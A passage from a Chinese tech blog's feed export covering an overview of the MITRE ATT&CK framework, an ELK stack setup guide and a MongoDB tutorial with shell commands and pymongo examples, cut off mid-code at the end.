class="headerlink" title="2.3.4 防御缺口评估"></a>2.3.4 防御缺口评估</h4><p>通过防御缺口评估，公司企业可确定自身哪些部分缺乏防护和/或可见性。这些缺口代表着防御上的盲点，入侵者可经由这些潜在通道秘密或彻底侵入网络。</p><h4 id="2-3-5-SOC成熟度评估"><a href="#2-3-5-SOC成熟度评估" class="headerlink" title="2.3.5 SOC成熟度评估"></a>2.3.5 SOC成熟度评估</h4><p>安全运营中心 (SOC) 是很多中大型企业网络持续监视活跃网络威胁<br>的关键部分。确定SOC有效性，重点在于了解其成熟度。</p><h4 id="2-3-6-网络威胁情报丰富化"><a href="#2-3-6-网络威胁情报丰富化" class="headerlink" title="2.3.6 网络威胁情报丰富化"></a>2.3.6 网络威胁情报丰富化</h4><p>网络威胁情报覆盖影响网络安全的网络威胁及威胁组织的知识，包含有关恶意软件、工具、TTP、谍报技术、行为和其他威胁相关指标的信息</p><h2 id="3-ATT-amp-CK模型"><a href="#3-ATT-amp-CK模型" class="headerlink" title="3 ATT&amp;CK模型"></a>3 ATT&amp;CK模型</h2><p>入侵者达成目标需进行各种各样的操作，ATT&amp;CK的基础便是体现这些操作的技术集合。模型中的战术类别，代表了入侵者的各个目标。这一相对简单的表现形式，在技术层面上的充足技术细节，与战术层面上入侵者操作为什么会出现的上下文之间，取得了有效平衡</p><h3 id="3-1-ATT-amp-CK-Matrix"><a href="#3-1-ATT-amp-CK-Matrix" class="headerlink" title="3.1 ATT&amp;CK Matrix"></a>3.1 ATT&amp;CK Matrix</h3><p>战术与技术间的关系可在ATT&amp;CK矩阵中可视化呈现。比如说，驻留 (Persistence)战术下(入侵者的目的就是在目标环境中持续存在)就有AppInit_DLLs注册表键用户进程注<br>入 (AppInit DLLs)、安装新服务 (New Service) 和计划任务(Scheduled Task) 等一系列技<br>术。其中每一个都是入侵者为达成驻留目的可能会用的单项技术。</p><h3 id="3-2-技术领域"><a href="#3-2-技术领域" class="headerlink" title="3.2 技术领域"></a>3.2 技术领域</h3><p>ATT&amp;CK 分为一系列“技术领域”——入侵者在其中运作的生态体系，ᨀ供入侵者达成目标所需规避或利用的约束集。MITRE目前定义有两个技术领域，分别是Enterprise（代表传统企业网络）和Mobile（适用移动通信设备）。平台可以是操作系统或应用程序（如Microsoft Windows）,下表是当前ATT&amp;CK技术领域界定的平台。</p><p>-|-<br>技术领域 | 界定平台<br>Enterprise | Linux/MacOS/Winodws<br>Mobile | Android/iOS</p><h3 id="3-3-战术"><a href="#3-3-战术" class="headerlink" title="3.3 战术"></a>3.3 战术</h3><p>战术代表着ATTCK技术的“为什么”，是入侵者的战术性目标：执行某攻击的原因。作为各项技术的有效上下文相关分类，战术阐释了入侵者在行动中会做的事，比如驻留、查找信息、横向移动、执行文件和渗漏数据。</p><h3 id="3-4-技术"><a href="#3-4-技术" class="headerlink" title="3.4 技术"></a>3.4 技术</h3><p>技术表现出入侵者是“怎么”通过执行操作达成战术目标的。例<br>如对发现 (Discovery)战术而言，里面罗列的技术强调了入侵者的特定动作追寻的是哪些类<br>型的信息。达成战术目标的途径或技术可能会有很多，所以每个战术类别下都有多种技术。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELK</title>
      <link href="/2020/05/27/ekl/"/>
      <url>/2020/05/27/ekl/</url>
      
        <content type="html"><![CDATA[<h2 id="ELK"><a href="#ELK" class="headerlink" title="ELK"></a>ELK</h2><p>ELK(Elasticsearch文本搜索引擎/Logstash日志收集插件/Kibana是Elasticssearch的Web控制台)三个软件的结合。<br><img src="https://pic.downk.cc/item/5efb56ad14195aa594a90404.png" alt=""></p><h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>ELK日志采集与分析系统的主要架构包括日志源、日志采集、数据缓存、数据格式化、日志存储和数据展示六个层面。<br><img src="https://pic.downk.cc/item/5efc939c14195aa594264d29.png" alt=""></p><ul><li>日志源：是系统分析的数据获取来源，日志形式可以有多种：本地文件、syslog数据、Netflow日志或Windows主机日志等。</li><li>日志采集：是将日志源数据采集到系统中，可以根据日志源格式的不同，指定不同的采集方式。在采集本地日志文件和syslog数据时，通常使用logstash shipper进行日志数据采集。部分特殊日志会选择使用beat采集。</li><li>数据缓存：使用logstash shipper采集日志时，为了保证日志数据的完整性，引入了redis缓存shipper采集来的日志数据，数据缓存的意义在于，及时ES集群出现故障，数据无法写入ES时依然可以存储在redis中，待ES集群恢复正常后再写入。</li><li>数据格式化：logstash shipper会将日志整条读取采集，为了便于存储和分析，使用logstash indexer对整条日志做字段分割的格式化处理，完成格式化后的日志写入ES集群。如数据源为Netflow数据或者使用beat做数据采集，则数据采集和数据格式化的功能都集中在logstash或beat中。</li><li>日志存储：将采集并完成格式化的日志数据统一存储在ElasticSearch集群中。数据存储在逻辑上将数据根据index划分，每一个index下存储一类日志数据；在真实的物理存储中，所有的数据被划分为一个个shard，存储在ElasticSearch集群各成员主机的路径下。</li><li>数据展示：日志存储至ES集群后，利用kibana将ES中存储的日志数据做可视化展示；利用“弋搜日志数据管理和分析面板”可以对原始数据进行分析，并且将分析逻辑和分析结果以各种图表的形式展示。</li></ul><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Elasticsearch是一个基于Apache Lucene(TM)的开源搜索引擎。其特点有：</p><ul><li>分布式的实时文件存储，每个字段都被索引并可被搜索</li><li>分布式的实时分析搜索引擎-做不规则查询</li><li>可以扩展到上百台服务器，处理PB级结构化或非结构化数据</li></ul><h4 id="配置Elasticsearch"><a href="#配置Elasticsearch" class="headerlink" title="配置Elasticsearch"></a>配置Elasticsearch</h4><ol><li><p>将安装包上传到linux服务器的/home/elk中</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> elk</code></pre></li><li><p>修改es的配置和jvm的配置文件<br>```bash<br>cd config<br>vim jvm.options<br>将jvm.options文件的第22行和23行改为</p></li></ol><p>-Xms128m(128m自定义大小，默认为4g,如果仅作测试不用设置太大，设置太大的话启动不了)</p><pre><code>```bashvim Elasticsearch.yml</code></pre><p><img src="https://pic.downk.cc/item/5efc4d3814195aa5940b05be.png" alt=""></p><ol start="3"><li>修改权限<br>在安装包的最顶级目录下新建一个data文件夹，并修改所有文件夹权限<pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> data<span class="token function">chmod</span> -R 777 *</code></pre></li><li>修改linux配置，配置ES能够占用的最大线程数、最大内存数、最大文件数<pre class=" language-bash"><code class="language-bash">vim /etc/security/limits.conf</code></pre><img src="https://pic.downk.cc/item/5efc4da514195aa5940b3113.png" alt=""></li></ol><pre class=" language-bash"><code class="language-bash">vim /etc/sysctl.confsysctl -p <span class="token comment" spellcheck="true">#使配置生效</span></code></pre><p><img src="https://pic.downk.cc/item/5efc4e0314195aa5940b72b3.png" alt=""></p><ol start="5"><li><p>新建一个用户用于运行elk,使用root会报错(如果被黑客攻破将可以使用root权限，为了安全起见不使用root运行elk)</p><pre class=" language-bash"><code class="language-bash">adduser elk<span class="token function">su</span> elk <span class="token comment" spellcheck="true">#切换为elk用户执行</span><span class="token function">cd</span> bin  <span class="token comment" spellcheck="true">#进入到bin目录下</span>./elasticsearch</code></pre></li><li><p>通过http://本机ip:9200访问得到下图证明搭建成功<br><img src="https://pic.downk.cc/item/5efc4e8514195aa5940bb7f1.png" alt=""></p></li></ol><h3 id="配置kibana"><a href="#配置kibana" class="headerlink" title="配置kibana"></a>配置kibana</h3><ol><li><p>将安装包上传到linux的/home/elk下</p></li><li><p>配置config下的kibana.yml文件(4个地方需要修改)<br><img src="https://pic.downk.cc/item/5efc537a14195aa5940d8ea8.png" alt=""><br><img src="https://pic.downk.cc/item/5efc53b714195aa5940dac3a.png" alt=""></p></li><li><p>启动kibana<br><img src="https://pic.downk.cc/item/5efc54b614195aa5940e1bf3.png" alt=""></p></li><li><p>访问kibana的Web界面,在搜索栏输入elasticsearch服务器所在ip地址:5601，出现以下界面说明kibana配置成功<br><img src="https://pic.downk.cc/item/5efc555c14195aa5940e5e27.png" alt=""></p></li></ol><h3 id="配置grafana"><a href="#配置grafana" class="headerlink" title="配置grafana"></a>配置grafana</h3>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB</title>
      <link href="/2020/05/23/mongodb/"/>
      <url>/2020/05/23/mongodb/</url>
      
        <content type="html"><![CDATA[<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>MongoDB是一个高性能、开源、无模式的文档类型数据库。</p><h3 id="MongoDB的性能"><a href="#MongoDB的性能" class="headerlink" title="MongoDB的性能"></a>MongoDB的性能</h3><ul><li>对数据库高并发请求</li><li>对海量数据的高效率存储和访问需求</li><li>对数据库的高可扩展性</li></ul><h3 id="NoSQL特点"><a href="#NoSQL特点" class="headerlink" title="NoSQL特点"></a>NoSQL特点</h3><ol><li>可以处理超大量的数据</li><li>可以运行在PC服务器集群上PC</li></ol><h3 id="MongoDB的特点"><a href="#MongoDB的特点" class="headerlink" title="MongoDB的特点"></a>MongoDB的特点</h3><p>MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库中功能最丰富、最像关系型数据库的。它支持的数据结构是比较松散的，是类似json的bjson格式，因此可以存储比较复杂的数据类型。MongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象查询语句，可以实现类似关系数据库单表查询的绝大部分功能，而且还支持数据建立索引。它是一个面向集合的，模式自由的文档型数据库</p><h4 id="面向集合-Collection-Oriented"><a href="#面向集合-Collection-Oriented" class="headerlink" title="面向集合(Collection-Oriented)"></a>面向集合(Collection-Oriented)</h4><p>数据被分组存储在数据集中，被称为一个集合(Collection)。每个集合在数据库中都有一个唯一的标识名，并且可以包含无限数目的文档。集合的概念类似关系型数据库里的表(table)，不同的是它不需要定义任何模式(schema)</p><h4 id="模式自由-Schema-free"><a href="#模式自由-Schema-free" class="headerlink" title="模式自由(Schema-free)"></a>模式自由(Schema-free)</h4><p>对于存储在MongoDB数据库中的文件，我们不需要知道它的任何结构定义，例如以下两个记录可以放在同一个集合里，即在关系数据库里，一个表有(name,age)，那么所有创建的对象就有这两个属性，但是mongoDB中不需要。</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"Welcome"</span><span class="token keyword">:</span><span class="token string">"Beijing"</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">"age"</span>:20<span class="token punctuation">}</span></code></pre><h4 id="文档型"><a href="#文档型" class="headerlink" title="文档型"></a>文档型</h4><p>我们存储的数据是键-值对的集合，键是字符串，值可以是数据类型集合里的任意类型，包括数组和文档，我们把这个格式叫做BSON(Binary Serialized document Notation)</p><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ul><li>网站数据：MongoDB非常适合实时的插入，更新和查询，并具备网站实时数据存储所需的复制及高度伸缩性</li><li>缓存：由于性能高，MongoDB也适合作为信息基础设施的缓存层，在系统重启之后，由MongoDB搭建的持久化缓存层可以避免下层的数据源过载</li><li>大尺寸，低价值的数据：使用传统的关系型数据库存储一些数据可能会比较昂贵，这时就可以采用MongoDB</li><li>高伸缩性场景：MongoDB非常适合由数十或数百台服务器组成的数据库</li><li>用于对象及JSON数据的存储：MongoDB的BSON数据格式非常适合文档化格式的存储及查询</li></ul><h2 id="MongoDB安装"><a href="#MongoDB安装" class="headerlink" title="MongoDB安装"></a>MongoDB安装</h2><ol><li>可以自行官网下载安装包</li><li>配置环境变量</li></ol><ul><li>找到mongoDB安装路径，进入到bin目录下，保存此文件路径，如： C:\Users\mongoDB\bin</li><li>右键点击此电脑-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量-&gt;编辑用户的变量path-&gt;将上面的路径添加进去</li></ul><ol start="3"><li>在安装MomgoDB文件夹的根目录新建一个文件夹data，在data中新建一个文件夹db,进入到mongoDB/bin的目录下，执行以下命令：<pre class=" language-bash"><code class="language-bash">mongod --dbpath E:\ data\ db</code></pre></li><li>启动mongoDB,此窗口为mongoDB服务器，cmd输入： mongod  （出现waiting for connecting port xx即表示成功开启服务）</li><li>重新开启一个cmd窗口，此窗口为mongoDB客户端，cmd输入：mongo 进行连接，当此窗口出现”&gt;”，进行简单操作验证是否成功<br><img src="https://pic.downk.cc/item/5ec66089c2a9a83be5cd4cb6.png" alt=""></li></ol><h3 id="图形化界面操作"><a href="#图形化界面操作" class="headerlink" title="图形化界面操作"></a>图形化界面操作</h3><p>可以使用robo3/mongoDB Compass图形界面</p><h2 id="MongoDB的操作"><a href="#MongoDB的操作" class="headerlink" title="MongoDB的操作"></a>MongoDB的操作</h2><h3 id="MongoDB与SQL的概念对比"><a href="#MongoDB与SQL的概念对比" class="headerlink" title="MongoDB与SQL的概念对比"></a>MongoDB与SQL的概念对比</h3><table><thead><tr><th>SQL</th><th>MongoDB</th></tr></thead><tbody><tr><td>database</td><td>database</td></tr><tr><td>table</td><td>collection</td></tr><tr><td>row</td><td>document or BSON document</td></tr><tr><td>column</td><td>field</td></tr><tr><td>index</td><td>index</td></tr><tr><td>primary key</td><td>_id(auto set)</td></tr></tbody></table><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>以下是几种MongoDB常用的数据类型：</p><table><thead><tr><th>类型</th><th>名称</th></tr></thead><tbody><tr><td>Object ID</td><td>文档ID</td></tr><tr><td>String</td><td>字符串，最常用，必须是有效的UTF-8</td></tr><tr><td>Boolean</td><td>存储一个布尔值，true/false</td></tr><tr><td>Integer</td><td>整数可以是32位或64位，这取决于服务器</td></tr><tr><td>Double</td><td>存储浮点值</td></tr><tr><td>Arrays</td><td>数组或列表，多个值存储在一个键</td></tr><tr><td>Object</td><td>用于嵌入式文档，即一个值为一个文档</td></tr><tr><td>Null</td><td>存储Null的值</td></tr><tr><td>Timestamp</td><td>时间戳</td></tr><tr><td>Date</td><td>存储当前日期或时间的UNIX时间格式</td></tr></tbody></table><h4 id="Object-ID"><a href="#Object-ID" class="headerlink" title="Object ID"></a>Object ID</h4><ol><li>每个文档都有一个属性，为_id，保证每个文档的唯一性</li><li>可以自己设置_id插入文档</li><li>如果没有提供，MongoDB默认为每个文档提供里一个独特的_id,类型为objectID</li><li>objectID是一个12字节的16进制数：</li></ol><ul><li>前4个字节为时间戳</li><li>接下来3个字节的机器ID</li><li>接下来的2个字节中MongoDB的服务进程id</li><li>最后3个字节是简单的增量值</li></ul><h3 id="collection与table的差异】"><a href="#collection与table的差异】" class="headerlink" title="collection与table的差异】"></a>collection与table的差异】</h3><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><table><thead><tr><th>id</th><th>title</th><th>content</th></tr></thead><tbody><tr><td>1</td><td>天气</td><td>万里无云</td></tr><tr><td>2</td><td>心情</td><td>哈哈</td></tr></tbody></table><p>特点：</p><ul><li>有结构</li><li>行遵循结构</li></ul><h4 id="collection"><a href="#collection" class="headerlink" title="collection"></a>collection</h4><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span>id:1,title:<span class="token string">'万里无云'</span><span class="token punctuation">}</span><span class="token punctuation">{</span>id:2,title:<span class="token string">'哈哈'</span>,date:<span class="token string">'2020'</span><span class="token punctuation">}</span></code></pre><p>特点：</p><ul><li>collection无结构</li><li>文档相互独立，没有固定的结构</li></ul><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><pre class=" language-bash"><code class="language-bash">show dbs  <span class="token comment" spellcheck="true">#查看已有数据库</span></code></pre><pre class=" language-bash"><code class="language-bash">use dataName  <span class="token comment" spellcheck="true">#选择数据库，如果没有此数据库则新建一个名字为dataName的数据库</span>use person</code></pre><pre class=" language-bash"><code class="language-bash">show collection <span class="token comment" spellcheck="true">#查看已有的集合</span></code></pre><pre class=" language-bash"><code class="language-bash">db.createCollection<span class="token punctuation">(</span><span class="token string">"集合名"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#创建集合</span>db.createCollection<span class="token punctuation">(</span><span class="token string">"student"</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">db.集合名.drop<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#删除表 ，先切换到该数据库才能进行删除</span></code></pre><pre class=" language-bash"><code class="language-bash">db.dropDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#删除当前数据库</span></code></pre><blockquote><p>注：如果我们对新创建的数据库没有进行操作，该数据库只是在内存中暂时存放，只有对该数据库进行实际操作后，数据库才会存放在硬盘里</p></blockquote><h2 id="MongoDB数据的基本操作"><a href="#MongoDB数据的基本操作" class="headerlink" title="MongoDB数据的基本操作"></a>MongoDB数据的基本操作</h2><h3 id="数据的增加"><a href="#数据的增加" class="headerlink" title="数据的增加"></a>数据的增加</h3><p>插入文档时，如果不指定_id参数，MongoDB会为文档分配一个唯一的ObjectID</p><h4 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h4><p>insert可以一次性插入一个文档，而不用遍历，效率高。insert中只要两个文档id相同就无法进行插入</p><pre class=" language-bash"><code class="language-bash">db.集合名.insert<span class="token punctuation">(</span>document<span class="token punctuation">)</span></code></pre><h4 id="save"><a href="#save" class="headerlink" title="save"></a>save</h4><p>在save方法里，如果不存在重复的对象，则向collection里插入数据，如果已经存在，save会调用update更新集合里的记录。save需要遍历列表，一个个插入，效率较低。save更新相同的id的内容</p><pre class=" language-bash"><code class="language-bash">db.集合名.save<span class="token punctuation">(</span>document<span class="token punctuation">)</span></code></pre><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>数据库student中有一个{ _ id:”1”,”name”:”zby”}的文档</p><pre class=" language-bash"><code class="language-bash">db.student.insert<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"_id"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"ybz"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#会报错，主键重复</span>db.student.save<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"_id"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"ybz"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#数据库的文档替换成{_id:"1","name":ybz}</span></code></pre><h4 id="插入多个文档"><a href="#插入多个文档" class="headerlink" title="插入多个文档"></a>插入多个文档</h4><p>使用列表插入</p><pre class=" language-bash"><code class="language-bash"> db.student.insert<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"zby"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"ybz"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"by"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>效果如图所示：<br><img src="https://pic.downk.cc/item/5ec74001c2a9a83be529899a.png" alt=""></p><h3 id="数据的修改"><a href="#数据的修改" class="headerlink" title="数据的修改"></a>数据的修改</h3><p>语法：</p><pre class=" language-bash"><code class="language-bash">db.集合名.update<span class="token punctuation">(</span><span class="token operator">&lt;</span>query<span class="token operator">></span>,<span class="token operator">&lt;</span>update<span class="token operator">></span>,<span class="token operator">&lt;</span>multi:boolean<span class="token operator">></span><span class="token punctuation">)</span></code></pre><ul><li>参数query: 查询条件，类似sql语句update中的where部分</li><li>参数update: 更新操作符，类似sql语句update中的set部分</li><li>参数multi:可选，默认false，表示只更新找到第一条记录，值为true标识把满足条件的所有文档全部更新</li></ul><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><pre class=" language-bash"><code class="language-bash">db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"by"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"age"</span>:18<span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#将第一条name为by的文档中的age改为18,并且会改变文档结构，即如果没有age会将name改为age来存储</span>db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"by"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token variable">$set</span>:<span class="token punctuation">{</span><span class="token string">"age"</span>:18<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#只更新数据，不更新文档结构</span>db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"by"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token variable">$set</span>:<span class="token punctuation">{</span><span class="token string">"age"</span>:18<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"multi"</span>:true<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#更新所有匹配到的数据</span></code></pre><p>原集合：<br><img src="https://pic.downk.cc/item/5ec746aac2a9a83be5367c60.png" alt=""></p><ol><li><p>执行</p><pre class=" language-bash"><code class="language-bash">db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span>,<span class="token string">"age"</span>:19<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><img src="https://pic.downk.cc/item/5ec74728c2a9a83be53775ae.png" alt=""></p></li><li><p>继续执行</p><pre class=" language-bash"><code class="language-bash">db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"age"</span>:19<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token variable">$set</span>:<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><img src="https://pic.downk.cc/item/5ec749bac2a9a83be53c3f34.png" alt=""></p></li><li><p>最后执行</p><pre class=" language-bash"><code class="language-bash">db.student.insert<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span>,<span class="token string">"age"</span>:35<span class="token punctuation">}</span><span class="token punctuation">)</span>db.student.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token variable">$set</span>:<span class="token punctuation">{</span><span class="token string">"age"</span>:20<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"multi"</span>:true<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><img src="https://pic.downk.cc/item/5ec76f4cc2a9a83be56fdd97.png" alt=""></p></li></ol><h3 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h3><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>查找到所有匹配数据</p><pre class=" language-bash"><code class="language-bash">db.集合名.find<span class="token punctuation">(</span><span class="token punctuation">{</span>条件文档<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="findOne"><a href="#findOne" class="headerlink" title="findOne"></a>findOne</h4><p>只返回匹配的第一个数据</p><pre class=" language-bash"><code class="language-bash">db.集合名.findOne<span class="token punctuation">(</span><span class="token punctuation">{</span>条件文档<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><table><thead><tr><th>语法</th><th>操作</th><th>格式</th></tr></thead><tbody><tr><td>$eq</td><td>等于</td><td>{<key>:<value>}</td></tr><tr><td>$lt</td><td>小于</td><td>{<key>:{$lt:<value>}}</td></tr><tr><td>$lte</td><td>小于或等于</td><td>{<key>:{$lte:<value>}}</td></tr><tr><td>$gt</td><td>大于</td><td>{<key>:{$gt:<value>}}</td></tr><tr><td>$gte</td><td>大于或等于</td><td>{<key>:{$gte:<value>}}</td></tr><tr><td>$ne</td><td>不等于</td><td>{<key>:{$ne:<value>}}</td></tr><tr><td>$or</td><td>或</td><td>{$or:[{},{}]}</td></tr><tr><td>$in</td><td>在范围内</td><td>{age:{$in:[value1,value2]}}</td></tr><tr><td>$nin</td><td>不在范围内</td><td>{age:{$nin:[value1,value2]}}</td></tr></tbody></table><h3 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h3><pre class=" language-bash"><code class="language-bash">db.student.remove<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#删除name=bob的文档</span>db.student.remove<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#删除集合里所有文档</span></code></pre><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><pre class=" language-bash"><code class="language-bash">db.student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"age"</span>:<span class="token punctuation">{</span><span class="token variable">$gt</span>:16<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>db.student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token variable">$or</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"age"</span>:<span class="token punctuation">{</span><span class="token variable">$gte</span>:18<span class="token punctuation">}</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bob"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><h4 id="模糊匹配"><a href="#模糊匹配" class="headerlink" title="模糊匹配"></a>模糊匹配</h4><p>使用//或$regex编写正则表达式</p><pre class=" language-bash"><code class="language-bash">db.student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span>:/^bob/<span class="token punctuation">}</span><span class="token punctuation">)</span>db.student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span>:<span class="token punctuation">{</span><span class="token variable">$regex</span><span class="token keyword">:</span><span class="token string">'^bob'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>用于读取指定数量的文档</p><pre class=" language-bash"><code class="language-bash">db.集合名.find<span class="token punctuation">(</span><span class="token punctuation">)</span>.limit<span class="token punctuation">(</span>number<span class="token punctuation">)</span></code></pre><h4 id="skip"><a href="#skip" class="headerlink" title="skip"></a>skip</h4><p>用于跳过指定数量的文档</p><pre class=" language-bash"><code class="language-bash">db.集合名.find<span class="token punctuation">(</span><span class="token punctuation">)</span>.skip<span class="token punctuation">(</span>number<span class="token punctuation">)</span></code></pre><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>用于对结果集合进行排序</p><pre class=" language-bash"><code class="language-bash">db.集合名.find<span class="token punctuation">(</span><span class="token punctuation">)</span>.sort<span class="token punctuation">(</span><span class="token punctuation">{</span>字段1，字段2<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li>参数1为升序排序</li><li>参数-1为降序排序</li></ul><h2 id="Python与MongoDB交互"><a href="#Python与MongoDB交互" class="headerlink" title="Python与MongoDB交互"></a>Python与MongoDB交互</h2><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><p>在Anaconda Prompt中使用pip安装(直接使用pycharm解释器搜索安装)</p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pymongo</code></pre><h3 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h3><p>在连接之前要确保mongoDB服务器已经打开</p><ol><li><p>引入包pymongo</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pymongo</code></pre></li><li><p>连接/创建客户端<br>下面是两种连接客户端的方法</p><pre class=" language-bash"><code class="language-bash">client <span class="token operator">=</span> pymongo.MongoClient<span class="token punctuation">(</span><span class="token string">"localhost"</span>,27017<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#也可以不传参，默认为本机mongoDB服务器</span>client <span class="token operator">=</span> pymongo.MongoClient<span class="token punctuation">(</span><span class="token string">"mongodb://localhost:27017"</span><span class="token punctuation">)</span></code></pre></li><li><p>获得数据库person<br>下面是两种获取数据库的方式</p><pre class=" language-bash"><code class="language-bash">db <span class="token operator">=</span> client.persondb <span class="token operator">=</span> client<span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span></code></pre></li><li><p>获得集合student<br>下面是两种获取集合的方式</p><pre class=" language-bash"><code class="language-bash">collection <span class="token operator">=</span> person.studentcollection <span class="token operator">=</span> person<span class="token punctuation">[</span><span class="token string">'student'</span><span class="token punctuation">]</span></code></pre></li><li><p>添加文档</p><pre class=" language-bash"><code class="language-bash">data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span 